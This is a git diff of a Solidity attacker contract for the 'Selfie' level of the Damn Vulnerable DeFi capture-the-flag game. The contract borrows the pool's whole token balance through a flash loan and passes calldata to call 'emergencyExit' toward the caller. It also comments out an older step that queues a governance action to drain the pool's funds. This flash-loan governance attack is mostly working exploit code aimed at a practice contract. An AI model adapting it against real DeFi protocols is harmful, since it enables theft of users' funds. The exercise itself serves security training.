@@ -5,12 +5,14 @@ import "../DamnValuableTokenSnapshot.sol";
 import "../selfie/SelfiePool.sol";
 import "../selfie/SimpleGovernance.sol";
 
-contract SelfieHack {
+error SelfieHackNotReceiveLoan();
+
+contract SelfieHack is IERC3156FlashBorrower {
     DamnValuableTokenSnapshot public token;
     SelfiePool public pool;
     SimpleGovernance public governance;
 
-    uint256 public actionId;
+    // uint256 public actionId;
 
     constructor(address _token, address _pool, address _governance) {
         token = DamnValuableTokenSnapshot(_token);
@@ -40,25 +42,31 @@ contract SelfieHack {
         //         address(msg.sender)
         //     )
         // );
+        if (token.balanceOf(address(this)) != token.balanceOf(address(pool)))
+            revert SelfieHackNotReceiveLoan();
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 
     function attack() external {
+        bytes memory data = abi.encodeWithSignature(
+            "emergencyExit(address)",
+            address(msg.sender)
+        );
         pool.flashLoan(
             IERC3156FlashBorrower(address(this)),
             address(token),
             token.balanceOf(address(pool)),
-            bytes("0x")
+            data
         );
         // This will run after the snapshot
-        actionId = governance.queueAction(
-            address(pool),
-            0,
-            abi.encodeWithSignature(
-                "drainAllFunds(address)",
-                address(msg.sender)
-            )
-        );
+        // actionId = governance.queueAction(
+        //     address(pool),
+        //     0,
+        //     abi.encodeWithSignature(
+        //         "emergencyExit(address)",
+        //         address(msg.sender)
+        //     )
+        // );
     }
 
     function attack2() external {
